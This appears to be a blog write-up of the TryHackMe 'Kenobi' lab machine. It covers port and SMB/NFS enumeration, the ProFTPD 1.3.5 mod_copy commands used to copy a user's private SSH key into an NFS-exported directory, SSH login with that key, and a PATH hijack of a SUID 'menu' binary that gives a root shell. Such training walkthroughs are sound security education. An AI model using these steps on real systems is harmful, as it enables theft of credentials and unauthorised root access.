---
layout: post
title: THM Kenobi WriteUp
date: 2025-02-25
categories:
  - TryHackMe
  - TryHackMe-Linux
tags:
  - CTF
  - TryHackMe
  - OSCP
  - Kenobi
  - Linux
  - Samba
  - SMB-Enumeration
  - NFS-Enumeration
  - ProFTPD
  - FTP-Exploitation
  - SSH
  - SUID
  - PATH-Hijacking
media_subpath: /assets/img/Kenobi
---
![Desktop View](Kenobi.png){: w="400"  h="400" }



# Kenobi Skills


>**Kenobi** is an easy Linux machine where we will use the following skills:

- **Port Discovery**
- **NFS Share Enumeration**
- **Anonymous NFS Access**
- **SUID Binary Exploitation**
- **Abusing menu Binary**

---
## IP Address Enumeration

Using the usual `nmap` scan I've discovered port **21, 22, 80, 111, 139, 445, 2049, 32987, 37377, 38609** & port **54133**:

```perl
❯ nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.207.108 -oG allPorts
Nmap scan report for 10.10.207.108
Host is up, received user-set (0.087s latency).
Scanned at 2025-02-23 08:56:19 CET for 14s
Not shown: 65524 closed tcp ports (reset)
PORT      STATE SERVICE      REASON
21/tcp    open  ftp          syn-ack ttl 63
22/tcp    open  ssh          syn-ack ttl 63
80/tcp    open  http         syn-ack ttl 63
111/tcp   open  rpcbind      syn-ack ttl 63
139/tcp   open  netbios-ssn  syn-ack ttl 63
445/tcp   open  microsoft-ds syn-ack ttl 63
2049/tcp  open  nfs          syn-ack ttl 63
32987/tcp open  unknown      syn-ack ttl 63
37377/tcp open  unknown      syn-ack ttl 63
38609/tcp open  unknown      syn-ack ttl 63
54133/tcp open  unknown      syn-ack ttl 63
```

Then i launched a basic group of scripts to seek more info from the open ports:

```java
❯ nmap -sCV -p21,22,80,111,139,445,2049,32987,37377,38609,54133 10.10.207.108 -oN targeted
Nmap scan report for 10.10.207.108
Host is up (0.088s latency).

PORT      STATE SERVICE     VERSION
21/tcp    open  ftp         ProFTPD 1.3.5
22/tcp    open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 b3:ad:83:41:49:e9:5d:16:8d:3b:0f:05:7b:e2:c0:ae (RSA)
|   256 f8:27:7d:64:29:97:e6:f8:65:54:65:22:f7:c8:1d:8a (ECDSA)
|_  256 5a:06:ed:eb:b6:56:7e:4c:01:dd:ea:bc:ba:fa:33:79 (ED25519)
80/tcp    open  http        Apache httpd 2.4.18 ((Ubuntu))
| http-robots.txt: 1 disallowed entry 
|_/admin.html
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
111/tcp   open  rpcbind     2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100003  2,3,4       2049/tcp   nfs
|   100003  2,3,4       2049/tcp6  nfs
|   100003  2,3,4       2049/udp   nfs
|   100003  2,3,4       2049/udp6  nfs
|   100005  1,2,3      37947/udp6  mountd
|   100005  1,2,3      44055/tcp6  mountd
|   100005  1,2,3      49526/udp   mountd
|   100005  1,2,3      54133/tcp   mountd
|   100021  1,3,4      38609/tcp   nlockmgr
|   100021  1,3,4      40991/tcp6  nlockmgr
|   100021  1,3,4      47539/udp   nlockmgr
|   100021  1,3,4      57827/udp6  nlockmgr
|   100227  2,3         2049/tcp   nfs_acl
|   100227  2,3         2049/tcp6  nfs_acl
|   100227  2,3         2049/udp   nfs_acl
|_  100227  2,3         2049/udp6  nfs_acl
139/tcp   open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp   open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
2049/tcp  open  nfs         2-4 (RPC #100003)
32987/tcp open  mountd      1-3 (RPC #100005)
37377/tcp open  mountd      1-3 (RPC #100005)
38609/tcp open  nlockmgr    1-4 (RPC #100021)
54133/tcp open  mountd      1-3 (RPC #100005)
Service Info: Host: KENOBI; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: 1h59m59s, deviation: 3h27m51s, median: -1s
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)
|   Computer name: kenobi
|   NetBIOS computer name: KENOBI\x00
|   Domain name: \x00
|   FQDN: kenobi
|_  System time: 2025-02-23T01:58:47-06:00
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2025-02-23T07:58:47
|_  start_date: N/A
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_nbstat: NetBIOS name: KENOBI, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
```

So we have to check the following ports & services:

- **Port 21 --> ProFTPD 1.3.5**
- **Port 22 --> OpenSSH 7.2p2
- **Port 80 --> Apache httpd 2.4.18
- **Port 111 --> rpcbind**
- **Port 139 --> Samba smbd 4.3.11-Ubuntu**
- **Port 445 --> Samba smbd 4.3.11-Ubuntu**
- **Port 2049 --> nfs**

Let's start with the **HTTP** service.

---
## Port 80 Enumeration

We can see in the `nmap` scan one disallowed entry in the **robots.txt**, so let's check the website and then `/admin.html`.

The main page it's just an image, nothing more.

![Desktop View](KenobiMainPage.png)

Checking the admin page, we can just a gif telling us that the web service "*It's Just a Trap!!*"

![Desktop View](KenobiTrap.png)

So let's check the **Samba** service.  

---
## Port 445 Enumeration

Let's start checking if we can access any share anonymously.

```bash
❯ smbclient -L \\10.10.207.108 -N

	Sharename       Type      Comment
	---------       ----      -------
	print$          Disk      Printer Drivers
	anonymous       Disk      
	IPC$            IPC       IPC Service (kenobi server (Samba, Ubuntu))
Reconnecting with SMB1 for workgroup listing.

	Server               Comment
	---------            -------

	Workgroup            Master
	---------            -------
	WORKGROUP            KENOBI
```

Bingo, there is a share named `anonymous`, let's find out what's inside.

```bash
❯ smbclient  \\\\10.10.207.108\\anonymous -N

Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Wed Sep  4 12:49:09 2019
  ..                                  D        0  Wed Sep  4 12:56:07 2019
  log.txt                             N    12237  Wed Sep  4 12:49:09 2019

		9204224 blocks of size 1024. 6877104 blocks available
smb: \> get log.txt 
getting file \log.txt of size 12237 as log.txt (34.4 KiloBytes/sec) (average 34.4 KiloBytes/sec)
```

We found a file named `log.txt`, so let's see it's content after downloading.

```plaintext
Generating public/private rsa key pair.
Enter file in which to save the key (/home/kenobi/.ssh/id_rsa): 
Created directory '/home/kenobi/.ssh'.
Enter passphrase (empty for no passphrase): 
Enter same passphrase again: 
Your identification has been saved in /home/kenobi/.ssh/id_rsa.
Your public key has been saved in /home/kenobi/.ssh/id_rsa.pub.

<REDACTED>
```

Nothing useful for the moment, but we can see that a private key is being saved at `/home/kenobi/.ssh/id_rsa`. 

Seeing we can't do much more for the moment, let's check the **FTP** service.

---
## Port 21 Enumeration

Let's start by checking if we can access with the user `anonymous`.

```bash
❯ ftp 10.10.207.108

Connected to 10.10.207.108.
220 ProFTPD 1.3.5 Server (ProFTPD Default Installation) [10.10.207.108]
Name (10.10.207.108:ne4rby): anonymous
331 Anonymous login ok, send your complete email address as your password
Password: 
530 Login incorrect.
ftp: Login failed
```

Unfortunately, the `anonymous` user is not allowed, but checking again the `nmap` report, the `ProFTPD 1.3.5` is kinda outdated, so let's check if there is any publicly exploit available.

```bash
❯ searchsploit proftpd 1.3.5

-------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                          |  Path
-------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
ProFTPd 1.3.5 - 'mod_copy' Command Execution (Metasploit)                                                                                               | linux/remote/37262.rb
ProFTPd 1.3.5 - 'mod_copy' Remote Command Execution                                                                                                     | linux/remote/36803.py
ProFTPd 1.3.5 - 'mod_copy' Remote Command Execution (2)                                                                                                 | linux/remote/49908.py
ProFTPd 1.3.5 - File Copy                                                                                                                               | linux/remote/36742.txt
-------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
```

We found 4 results, but they seem to be the same vulnerability, so let's see the `ProFTPd 1.3.5 - 'mod_copy' Remote Command Execution (2)`.

Taking a look to one of the exploits found, seems like we can copy a file to other location in the server, so my first thought was to move the `id_rsa` to the web server, so i can access it via browser, but that doesn't seem to work.

So, taking a look to the `nmap` report, we can see at port **111**, that there is a `nfs` service that might have some shares exposed.

Let's make a request with `rpcenum` to the target.

```bash
❯ rpcinfo -p 10.10.74.241

   program vers proto   port  service
    100000    4   tcp    111  portmapper
    100000    3   tcp    111  portmapper
    100000    2   tcp    111  portmapper
    100000    4   udp    111  portmapper
    100000    3   udp    111  portmapper
    100000    2   udp    111  portmapper
    100005    1   udp  57269  mountd
    100005    1   tcp  44893  mountd
    100005    2   udp  49417  mountd
    100005    2   tcp  60341  mountd
    100005    3   udp  40009  mountd
    100005    3   tcp  44087  mountd
    100003    2   tcp   2049  nfs
    100003    3   tcp   2049  nfs
    100003    4   tcp   2049  nfs
    100227    2   tcp   2049  nfs_acl
    100227    3   tcp   2049  nfs_acl
    100003    2   udp   2049  nfs
    100003    3   udp   2049  nfs
    100003    4   udp   2049  nfs
    100227    2   udp   2049  nfs_acl
    100227    3   udp   2049  nfs_acl
    100021    1   udp  52982  nlockmgr
    100021    3   udp  52982  nlockmgr
    100021    4   udp  52982  nlockmgr
    100021    1   tcp  44677  nlockmgr
    100021    3   tcp  44677  nlockmgr
    100021    4   tcp  44677  nlockmgr
```

We can see many `nfs` and `mountd` services, let's see what's mounted.

```bash
❯ showmount -e 10.10.74.241

Export list for 10.10.74.241:
/var *
```

There is a share show the whole content of the `/var` folder, so let's mount it locally.

```bash
❯ mkdir KenobiNFS
❯ mount -t nfs 10.10.74.241:/var KenobiNFS
```

Once mounted we can now move the kenobi `id_rsa` to the `/var/tmp` folder and then access it via the mounted file system.

Access the ftp service via `netcat`.

```bash
❯ nc 10.10.74.241 21
```

Then in order to copy  the `id_rsa` to the `/var/tmp`, we can use the commands `SITE CPFR` and `SITE CPTO`.

```bash
SITE CPFR /home/kenobi/.ssh/id_rsa
SITE CPTO /var/tmp/id_rsa
250 Copy successful
```

Once copied, we should be able to see it in our mounted share.

```bash
❯ ls -l
drwx------ root   root   4.0 KB Tue Feb 25 20:14:08 2025  systemd-private-118fe101f90f4e1087902d43b982cdf3-systemd-timesyncd.service-cvdfpY
drwx------ root   root   4.0 KB Wed Sep  4 14:09:48 2019  systemd-private-2408059707bc41329243d2fc9e613f1e-systemd-timesyncd.service-a5PktM
drwx------ root   root   4.0 KB Wed Sep  4 14:28:49 2019  systemd-private-6f4acd341c0b40569c92cee906c3edc9-systemd-timesyncd.service-z5o4Aw
drwx------ root   root   4.0 KB Wed Sep  4 10:49:43 2019  systemd-private-e69bbb0653ce4ee3bd9ae0d93d2a5806-systemd-timesyncd.service-zObUdn
.rw-r--r-- ne4rby ne4rby 1.6 KB Tue Feb 25 20:34:16 2025 󰷖 id_rsa
```

Once at this point, let's log in as `kenobi` with private key.

```bash
❯ cp KenobiNFS/tmp/id_rsa .
❯ chmod 600 id_rsa
❯ ssh -i id_rsa kenobi@10.10.74.241
The authenticity of host '10.10.74.241 (10.10.74.241)' can't be established.
ED25519 key fingerprint is SHA256:GXu1mgqL0Wk2ZHPmEUVIS0hvusx4hk33iTcwNKPktFw.
This host key is known by the following other names/addresses:
    ~/.ssh/known_hosts:15: [hashed name]
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.74.241' (ED25519) to the list of known hosts.
Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.8.0-58-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

103 packages can be updated.
65 updates are security updates.


Last login: Wed Sep  4 07:10:15 2019 from 192.168.1.147
To run a command as administrator (user "root"), use "sudo <command>".
See "man sudo_root" for details.

kenobi@kenobi:~$ 
```

---
## Shell as Kenobi

Once inside we can read the `user.txt` flag at `/home/kenobi/user.txt`.

```bash
kenobi@kenobi:~$ cat user.txt 
d0b0*****b6caa532a83*******24899
```

Checking `Kenobi` groups we see that we are inside the `sudo` group, but unfortunately we don't have the `Kenobi` user, so let's keep enumerating.

```bash
kenobi@kenobi:~$ id
uid=1000(kenobi) gid=1000(kenobi) groups=1000(kenobi),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),110(lxd),113(lpadmin),114(sambashare)
```

You might thinking that we are also inside the `lxd` group, but unfortunately `lxd` service inactive.

We can't see any output from `sudo -l` since we don't own the kenobi's password, so after looking for `SUID` binaries, there is a unusual binary named `menu`, let's see what it does.

```bash
kenobi@kenobi:/$ strings /usr/bin/menu

<REDACTED>

***************************************
1. status check
2. kernel version
3. ifconfig
** Enter your choice :
curl -I localhost
uname -r
ifconfig

<REDACTED>
```

Seems like the script allow us to execute a predefined command, but there is a vulnerability in this binary, it't not using the full path to the binaries, so we should be able to exploit a **path hijack**.

In order to execute this, let's create a file named `ifconfig` inside the `/tmp` folder, where it's content is the same as `/bin/bash`.

```bash
kenobi@kenobi:/$ cd /tmp
kenobi@kenobi:/tmp$ echo /bin/bash > ifconfig
kenobi@kenobi:/tmp$ chmod +x ifconfig
```

Once with the file created, let's hijack the path.

```bash
kenobi@kenobi:/tmp$ export PATH=/tmp:$PATH
kenobi@kenobi:/tmp$ echo $PATH
/tmp:/home/kenobi/bin:/home/kenobi/.local/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
```

As you can see now the `/tmp` folder is now included in the path, so the `menu` binary will now look for the `ifconfig` at `/tmp` instead of `/usr/bin/ifconfig`.

Then we just have to execute `menu` and select option 3 and we should get a shell as `root`.

```bash
kenobi@kenobi:/tmp$ menu

***************************************
1. status check
2. kernel version
3. ifconfig
** Enter your choice :3
To run a command as administrator (user "root"), use "sudo <command>".
See "man sudo_root" for details.

root@kenobi:/tmp# whoami
root
```

Once as `root` we can read the `root.txt` flag at `/root/root.txt`.

```bash
root@kenobi:/tmp# cat /root/root.txt 
177******62289f3738*******381f02
```

---
## Final Thoughts

The **Kenobi** machine provides a well-structured learning experience, focusing on fundamental enumeration techniques and privilege escalation. The exploitation phase is straightforward, requiring careful **NFS enumeration** to gain initial access. Privilege escalation, while not overly complex, is a great exercise in recognizing **SUID misconfigurations** and leveraging for root access. A solid machine that reinforces core skills and serves as an excellent stepping stone for more advanced challenges.

![Desktop View](KenobiPwn.png)

-- -
**Thanks for reading, i’ll appreciate that you take a look to my other posts :)**

